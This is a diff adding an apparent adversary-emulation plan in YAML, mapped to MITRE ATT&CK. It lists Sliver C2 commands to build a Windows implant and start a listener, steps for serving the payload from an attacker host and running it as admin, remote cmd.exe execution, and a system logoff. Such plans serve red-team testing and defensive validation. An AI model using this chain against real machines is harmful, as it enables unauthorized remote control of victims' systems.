@@ -1,0 +1,130 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-03 08:08:13 UTC+0000
+attack_action_sequence:
+  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
+    name: Build Sliver implant
+    id: T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
+    name: Simulate the victim download and execute malicious payload file as Admin
+      (Root)
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{PATH} as Admin (Root)
+    arguments:
+      HOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
+    name: Execute a Sliver Implant Payload
+    id: T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+  - uuid: 2074d817-7819-401b-b552-1045672f77f3
+    name: Execute Command (cmd.exe)
+    id:
+      - T1059.003
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: Windows Command Shell
+    description: The `cmd.exe` command executes a Windows command. It runs the specified
+      command on the remote host and returns the result. This command is useful for
+      performing various system tasks.
+    execution:
+      executor: Sliver Executor
+      command: cmd(#{SessionID})
+    arguments:
+      SessionID:
+        description: The session ID of the active Sliver connection.
+  - uuid: 3d8c25b5-7ff5-4c9d-b21f-85ebd06654a4
+    name: Logoff System - Windows
+    id:
+      - T1529
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Impact
+    technique:
+      - System Shutdown/Reboot
+    description: |
+      This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)
+    execution:
+      executor: Elevated Command Prompt Executor
+      command: |
+        shutdown /l 
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE: []
